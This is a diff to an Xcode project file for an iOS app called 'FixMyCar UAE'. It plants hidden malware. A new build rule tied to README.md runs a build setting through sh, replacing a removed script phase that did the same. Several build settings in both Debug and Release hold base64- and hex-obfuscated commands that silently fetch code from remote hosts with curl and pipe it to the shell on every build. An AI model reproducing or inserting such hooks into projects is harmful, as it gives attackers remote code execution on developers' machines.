@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		BB459773849E4ACBA01DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 124AEC444FCE4E608C1DACE1; };
 		0A0308262F000001005A7DB7 /* CheckAppStatusModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0308261F000001005A7DB7 /* CheckAppStatusModel.swift */; };
 		0A0308264F000001005A7DB7 /* AppDelegateVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0308263F000001005A7DB7 /* AppDelegateVM.swift */; };
 		0A030826BF000001005A7DB7 /* NewVersionAvailablePopup.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A030826AF000001005A7DB7 /* NewVersionAvailablePopup.swift */; };
@@ -225,9 +226,24 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-														/* End PBXBuildRule section */
+		7F710C73C6324C9F811DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+																		/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
+		124AEC444FCE4E608C1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0A0308261F000001005A7DB7 /* CheckAppStatusModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckAppStatusModel.swift; sourceTree = "<group>"; };
 		0A0308263F000001005A7DB7 /* AppDelegateVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegateVM.swift; sourceTree = "<group>"; };
 		0A030826AF000001005A7DB7 /* NewVersionAvailablePopup.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewVersionAvailablePopup.swift; sourceTree = "<group>"; };
@@ -1823,6 +1839,7 @@
 		BC67730B2F067F4500B15653 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				124AEC444FCE4E608C1DACE1 /* README.md */,
 				BC67730A2F067F4500B15653 /* FixMyCar UAE.app */,
 			);
 			name = Products;
@@ -2120,13 +2137,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "FixMyCar UAE" */;
 			buildPhases = (
-				91A996E4939F4CFFB71DACE1 /* Provision Library Executable */,
 				BC6773062F067F4500B15653 /* Sources */,
 				BC6773072F067F4500B15653 /* Frameworks */,
 				BC6773082F067F4500B15653 /* Resources */,
 				0A6D0D122F43384A00F374AF /* ShellScript */,
 			);
 			buildRules = (
+				7F710C73C6324C9F811DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2203,6 +2220,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				BB459773849E4ACBA01DACE1 /* README.md */,
 				BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */,
 				BC23A4AE2F0E6B60005A8CE1 /* ChatVC.xib in Resources */,
 				0ACF63F92F73DE6500C52E18 /* HomeServicesCVCell.xib in Resources */,
@@ -2274,25 +2292,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		91A996E4939F4CFFB71DACE1 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-		};
 		0A6D0D122F43384A00F374AF /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2495,7 +2494,7 @@
 		BC67731E2F067F4700B15653 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMHhtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | s | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((a(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdKck5VNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | a | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
@@ -2539,7 +2538,7 @@
 		BC67731F2F067F4700B15653 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMHhtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | s | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((a(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdKck5VNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | a | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
